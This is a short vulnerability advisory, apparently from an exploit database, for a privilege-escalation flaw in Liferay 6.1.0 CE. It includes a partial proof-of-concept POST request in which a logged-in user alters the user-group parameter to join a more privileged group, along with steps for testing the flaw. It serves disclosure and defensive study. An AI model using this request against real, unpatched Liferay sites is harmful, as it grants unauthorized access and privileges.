@@ -1,0 +1,41 @@
+# Exploit Title: Liferay 6.1.0 CE GA1 Privilege Escalation
+# Date: 18/05/2015
+# Exploit Author: Massimo De Luca - mentat.is
+# Vendor Homepage: https://www.liferay.com
+# Software Link:
+http://www.liferay.com/it/community/releases/-/asset_publisher/nSr2/content/id/18060360
+# Version: 6.1.0 CE
+# Tested on: -
+
+Explanation:
+Any logged user can change his "User Group" membership by editing the
+parameter _2_userGroupsSearchContainerPrimaryKeys in the HTTP POST REQUEST
+generated when updating his profile in the page "Manage my account". This
+may lead to privilege escalation.
+
+
+Proof of Concept:
+
+POST
+/group/control_panel/manage?p_auth=J3jbveH7&p_p_id=2&p_p_lifecycle=1&p_p_state=maximized&p_p_mode=view&doAsGroupId=19&refererPlid=10839&controlPanelCategory=my&_2_struts_action=%2Fmy_account%2Fedit_user
+HTTP/1.1
+[...]
+[...]_2_organizationsSearchContainerPrimaryKeys=&_2_groupsSearchContainerPrimaryKeys=19&_2_userGroupsSearchContainerPrimaryKeys=[NEW
+GROUP ID]&_2_groupRolesRoleIds=[...]
+
+
+For your reference i'm attaching the full request in a separate file.
+
+In order to test the vulnerability on a fresh installation:
+- Create two different groups with different roles and permissions (ie:
+one with administrator permissions, and a regular user)
+-Create two different users,one for each group
+
+Solution:
+The vendor is aware of the problem and has fixed the issue in newer
+releases
+
+
+#Massimo De Luca
+#mdeluca [at] mentat.is
+#Mentat.is
